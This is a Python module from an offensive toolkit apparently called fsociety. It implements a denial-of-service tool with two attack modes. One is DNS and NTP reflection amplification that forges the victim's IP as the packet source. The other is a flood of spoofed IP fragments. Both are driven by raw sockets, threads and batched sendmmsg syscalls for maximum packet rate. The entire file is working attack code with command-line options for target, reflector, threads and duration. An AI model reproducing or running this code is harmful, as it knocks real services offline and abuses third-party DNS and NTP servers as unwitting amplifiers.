from __future__ import annotations
import ctypes
import os
import random
import socket
import struct
import threading
import time

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.live import LiveAttack

SYS_SENDMMSG = 307

class Mmsghdr(ctypes.Structure):
    _fields_ = [("msg_hdr", ctypes.c_byte * 56), ("msg_len", ctypes.c_uint32)]


@tool("dos", "High-PPS amplification and fragmentation", category="dos")
class Dos:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        amp = sub.add_parser("amp")
        amp.add_argument("target")
        amp.add_argument("reflector")
        amp.add_argument("--proto", default="dns", choices=["dns", "ntp"])
        amp.add_argument("--threads", type=int, default=8)
        amp.add_argument("--duration", type=int, default=60)
        amp.add_argument("--batch", type=int, default=256)

        frag = sub.add_parser("frag")
        frag.add_argument("target")
        frag.add_argument("--threads", type=int, default=8)
        frag.add_argument("--duration", type=int, default=60)
        frag.add_argument("--batch", type=int, default=1024)

    @staticmethod
    def _build_dns_amp(victim: str, reflector: str) -> bytes:
        payload = b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03isc\x03org\x00\x00\xff\x00\x01"
        sport = random.randint(1024, 65535)
        udp = struct.pack("!HHHH", sport, 53, 8 + len(payload), 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(payload), random.randint(0, 65535),
                         0, 64, 17, 0, socket.inet_aton(victim), socket.inet_aton(reflector))
        return ip + udp + payload

    @staticmethod
    def _build_ntp_amp(victim: str, reflector: str) -> bytes:
        payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
        sport = random.randint(1024, 65535)
        udp = struct.pack("!HHHH", sport, 123, 8 + len(payload), 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(payload), random.randint(0, 65535),
                         0, 64, 17, 0, socket.inet_aton(victim), socket.inet_aton(reflector))
        return ip + udp + payload

    @staticmethod
    def _build_frag(target: str) -> bytes:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        payload = os.urandom(8)
        udp = struct.pack("!HHHH", random.randint(1024, 65535), random.randint(1, 65535), 8 + len(payload), 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + len(payload), random.randint(0, 65535),
                         0x1FFF, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(target))
        return ip + udp + payload

    @staticmethod
    def _sender(victim: str, dest: str, proto: str, batch: int,
                stop_event: threading.Event, stats: dict, lock: threading.Lock):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            return

        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        sockaddr = struct.pack("!HH4s8x", socket.AF_INET, 0, socket.inet_aton(dest))
        msgs = (Mmsghdr * batch)()
        keep_alive = []

        for i in range(batch):
            if proto == "dns":
                pkt = Dos._build_dns_amp(victim, dest)
            elif proto == "ntp":
                pkt = Dos._build_ntp_amp(victim, dest)
            else:
                pkt = Dos._build_frag(victim)

            buf = ctypes.create_string_buffer(pkt)
            iov = (ctypes.c_byte * 16)()
            ctypes.memmove(iov, struct.pack("Q", ctypes.addressof(buf)), 8)
            ctypes.memmove(ctypes.addressof(iov) + 8, struct.pack("Q", len(pkt)), 8)
            sa_buf = ctypes.create_string_buffer(sockaddr)
            hdr = msgs[i].msg_hdr
            ctypes.memmove(ctypes.addressof(hdr) + 0, struct.pack("Q", ctypes.addressof(sa_buf)), 8)
            ctypes.memmove(ctypes.addressof(hdr) + 8, struct.pack("I", 16), 4)
            ctypes.memmove(ctypes.addressof(hdr) + 16, struct.pack("Q", ctypes.addressof(iov)), 8)
            ctypes.memmove(ctypes.addressof(hdr) + 24, struct.pack("Q", 1), 8)
            msgs[i].msg_len = len(pkt)
            keep_alive.append((buf, iov, sa_buf))

        fd = s.fileno()
        msgs_ref = ctypes.byref(msgs)
        sent_local = 0
        cycles = 0
        refresh_every = 200

        while not stop_event.is_set():
            try:
                n = libc.syscall(SYS_SENDMMSG, fd, msgs_ref, batch, 0)
                if n > 0:
                    sent_local += n
            except Exception:
                pass

            cycles += 1
            if sent_local >= 50000:
                with lock:
                    stats["sent"] = stats.get("sent", 0) + sent_local
                sent_local = 0

            if refresh_every and cycles % refresh_every == 0:
                for i in range(batch):
                    if proto == "dns":
                        pkt = Dos._build_dns_amp(victim, dest)
                    elif proto == "ntp":
                        pkt = Dos._build_ntp_amp(victim, dest)
                    else:
                        pkt = Dos._build_frag(victim)

                    buf = ctypes.create_string_buffer(pkt)
                    ctypes.memmove(keep_alive[i][1], struct.pack("Q", ctypes.addressof(buf)), 8)
                    ctypes.memmove(ctypes.addressof(keep_alive[i][1]) + 8, struct.pack("Q", len(pkt)), 8)
                    msgs[i].msg_len = len(pkt)
                    keep_alive[i] = (buf, keep_alive[i][1], keep_alive[i][2])

        with lock:
            stats["sent"] = stats.get("sent", 0) + sent_local
        s.close()

    @staticmethod
    def run(args, log: Log) -> int:
        if os.geteuid() != 0:
            log.err("Raw sockets require root. Run: sudo python3 r3con.py")
            return 1

        if args.cmd == "amp":
            try:
                victim = socket.gethostbyname(args.target)
            except socket.gaierror:
                victim = args.target

            log.info(f"AMP LAUNCHED | Victim: {victim} | Reflector: {args.reflector} | Proto: {args.proto.upper()}")

            stop_event = threading.Event()
            stats = {"sent": 0}
            lock = threading.Lock()
            threads = []

            live = LiveAttack(
                target=f"{victim} <- {args.reflector} ({args.proto.upper()})",
                mode=f"amp-{args.proto}",
                threads=args.threads,
                batch=args.batch,
                duration=args.duration,
            )
            live.start()

            for _ in range(args.threads):
                t = threading.Thread(
                    target=Dos._sender,
                    args=(victim, args.reflector, args.proto, args.batch, stop_event, stats, lock),
                    daemon=True,
                )
                t.start()
                threads.append(t)

            start = time.time()
            try:
                while time.time() - start < args.duration:
                    time.sleep(0.1)
                    with lock:
                        current = stats.get("sent", 0)
                    live.render(current)
            except KeyboardInterrupt:
                pass

            stop_event.set()
            for t in threads:
                t.join(timeout=2)

            with lock:
                total = stats.get("sent", 0)
            live.finish(total)
            return 0

        elif args.cmd == "frag":
            try:
                target = socket.gethostbyname(args.target)
            except socket.gaierror:
                target = args.target

            log.info(f"FRAG LAUNCHED | Target: {target} | Threads: {args.threads} | Batch: {args.batch}")

            stop_event = threading.Event()
            stats = {"sent": 0}
            lock = threading.Lock()
            threads = []

            live = LiveAttack(
                target=target,
                mode="fragmentation",
                threads=args.threads,
                batch=args.batch,
                duration=args.duration,
            )
            live.start()

            for _ in range(args.threads):
                t = threading.Thread(
                    target=Dos._sender,
                    args=(target, target, "frag", args.batch, stop_event, stats, lock),
                    daemon=True,
                )
                t.start()
                threads.append(t)

            start = time.time()
            try:
                while time.time() - start < args.duration:
                    time.sleep(0.1)
                    with lock:
                        current = stats.get("sent", 0)
                    live.render(current)
            except KeyboardInterrupt:
                pass

            stop_event.set()
            for t in threads:
                t.join(timeout=2)

            with lock:
                total = stats.get("sent", 0)
            live.finish(total)
            return 0

        return 2
